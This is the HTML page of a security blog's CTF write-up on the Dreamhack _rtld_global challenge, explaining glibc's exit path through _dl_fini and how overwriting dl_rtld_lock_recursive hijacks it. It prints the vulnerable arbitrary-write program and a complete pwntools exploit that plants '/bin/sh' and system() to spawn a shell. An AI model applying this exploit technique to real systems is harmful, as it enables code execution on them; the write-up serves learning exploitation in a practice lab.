@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] rtld global · whrds.log</title><meta name="description" content="rtld global is a structure for managing code and variables when a program is executed and registered as a process. It is referenced at the point where execution ends. It can be checked when terminated by return. This is a simple practical example.#include int main(){ return 0; }If you check the binary __stack, you can see the main function call.">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-rtld-global/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rtld-global/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rtld-global/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] rtld global · whrds.log"><meta property="og:description" content="rtld global is a structure for managing code and variables when a program is executed and registered as a process. It is referenced at the point where execution ends. It can be checked when terminated by return. This is a simple practical example.#include int main(){ return 0; }If you check the binary __stack, you can see the main function call."><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-rtld-global/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] rtld global","description":"rtld global is a structure for managing code and variables when a program is executed and registered as a process. It is referenced at the point where execution ends. It can be checked when terminated by return. This is a simple practical example.#include int main(){ return 0; }If you check the binary __stack, you can see the main function call.","datePublished":"2024-06-24","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-rtld-global/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-rtld-global/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] rtld global</h1><p class="article-description">rtld global is a structure for managing code and variables when a program is executed and registered as a process. It is referenced at the point where execution ends. It can be checked when terminated by return. This is a simple practical example.#include int main(){ return 0; }If you check the binary __stack, you can see the main function call.</p><div class="article-meta"><time datetime="2024-06-24">Jun 24, 2024</time><span>·</span><span>3 min read</span></div></header><div class="prose"><h3>rtldglobal</h3>
+<p>This is a structure for managing code and variables when a program is executed and registered as a process.</p>
+<p>It is referenced at the point where execution ends.</p>
+<p>It can be checked when terminated by return.</p>
+<p>This is a simple practice example.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+int main(){
+	return 0;
+    }
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/001.png" alt=""></p>
+<p>If you check the binary __stack, you can see that the main function call is made in __libc_start_main.</p>
+<p>In other words, when the main function ends, the return address is also __libc_start_main.</p>
+<p>Let’s continue to step into here.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/002.png" alt=""></p>
+<p>If you go a little deeper, a function called __GI_exit is called.</p>
+<p>And then call __run_exit_handlers.</p>
+<p>Now, it depends on whether return is used at the end of the function or not.</p>
+<p>Because this example uses it, the function _dl_fini is called.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/003.png" alt=""></p>
+<p>According to the dreamhack explanation, the __rtld_lock_lock_recursive function is called here, but gdb says that in the above state</p>
+<p>It goes to the __GI__exit function and ends.</p>
+<pre><code># define __rtld_lock_lock_recursive(NAME) \
+  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)
+  
+void
+_dl_fini (void)
+{
+#ifdef SHARED
+  int do_audit = 0;
+ again:
+#endif
+  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)
+    {
+      /* Protect against concurrent loads and unloads.  */
+      __rtld_lock_lock_recursive (GL(dl_load_lock));
+</code></pre>
+<p>In the __di_fini function, call the recursive function with dl_load_lock as an argument.</p>
+<p> __rtld_lock_lock_recursive is used as a macro in the code as a function pointer called dl_rtld_lock_recursive.</p>
+<p>The pointer is called a member variable of the _rtld_global structure.</p>
+<p>Let’s take a look at the _rtld_global variable.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/004.png" alt=""></p>
+<p>We are friends for quite a long time.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/005.png" alt=""></p>
+<p>This is the definition of _dl_rtld_lock_recursive.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/006.png" alt=""></p>
+<p>When viewed in a running state, the address of rtld_lock_default_lock_recursive is stored.</p>
+<p>An attack is possible by modifying the memory using this part.</p>
+<hr>
+<p>dreamhack _rtld_global problem</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void init() {
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+}
+
+int main() {
+  long addr;
+  long data;
+  int idx;
+
+  init();
+
+  printf(&quot;stdout: %p\n&quot;, stdout);
+  while (1) {
+    printf(&quot;&gt; &quot;);
+    scanf(&quot;%d&quot;, &amp;idx);
+    switch (idx) {
+      case 1:
+        printf(&quot;addr: &quot;);
+        scanf(&quot;%ld&quot;, &amp;addr);
+        printf(&quot;data: &quot;);
+        scanf(&quot;%ld&quot;, &amp;data);
+        *(long long *)addr = data;
+        break;
+      default:
+        return 0;
+    }
+  }
+  return 0;
+}
+</code></pre>
+<p>This is the problem code.</p>
+<p>In case 1, you can see that a got overwrite vulnerability occurs.</p>
+<p>Since the address of stdout is leaked, libc_base can be obtained using that address.</p>
+<p>Patch the libraries used using the patchelf command.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/007.png" alt=""></p>
+<p>If you check with gdb, you can see that it has changed normally.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/008.png" alt=""></p>
+<p>If you calculate the difference from the existing libc_base, you get 0x3f1000.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/009.png" alt=""></p>
+<p>_rtld_global address calculation process.</p>
+<p>To find the offset of a member variable in a structure, you need a debugging symbol that contains structure and member variable information.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/010.png" alt=""></p>
+<p>The detailed version of glibc is 2.27-3ubuntu1.</p>
+<pre><code> wget http://launchpadlibrarian.net/365856914/libc6-dbg_2.27-3ubuntu1_amd64.deb
+ 
+ dpkg -x libc6-dbg_2.27-3ubuntu1_amd64.deb ./
+</code></pre>
+<p>Download and extract the package appropriate for the version.</p>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/011.png" alt=""></p>
+<p>Now that we have the offset of the member variable, we can perform the attack.</p>
+<p>This is the entire payload.</p>
+<pre><code>from pwn import*
+
+p = process(['./ow_rtld'],env={'LD_PRELOAD':'./libc-2.27.so'})
+e = ELF('./ow_rtld')
+libc = ELF('./libc-2.27.so')
+ld = ELF('./ld-2.27.so')
+
+context.log_level='debug'
+
+p.recvuntil(b&quot;: &quot;)
+stdout = int(p.recvn(14),16)
+print(&quot;stdout@add : &quot;,hex(stdout))
+
+stdout_offset = libc.sym['_IO_2_1_stdout_']
+libc_base = stdout - stdout_offset
+print(&quot;libc_base@add : &quot;, hex(libc_base))
+
+ld_base = libc_base + 0x3f1000
+print(&quot;ld_base@add : &quot;, hex(ld_base))
+
+rtld_global = ld_base + ld.sym['_rtld_global']
+dl_load_lock = rtld_global + 2312
+dl_rtld_lock_recursive = rtld_global + 3840
+
+print(&quot;rtld_global@add : &quot;,hex(rtld_global))
+print(&quot;dl_load_lock@add : &quot;,hex(dl_load_lock))
+print(&quot;dl_rtld_lock_recursive@add : &quot;,hex(dl_rtld_lock_recursive))
+
+system_offset = libc.sym['system']
+system = libc_base + system_offset
+
+def send(add,val):
+    p.sendlineafter(b'&gt;',b'1')
+    p.sendlineafter(b'addr: ',str(add))
+    p.sendlineafter(b'data: ',str(val))
+
+send(dl_load_lock, u64('/bin/sh\x00'))
+
+send(dl_rtld_lock_recursive,system)
+
+p.sendlineafter(b'&gt; ',b'2')
+
+p.interactive()
+</code></pre>
+<p><img src="/assets/images/tistory/tistory-6887f7a3f117/012.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-rtld-global/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
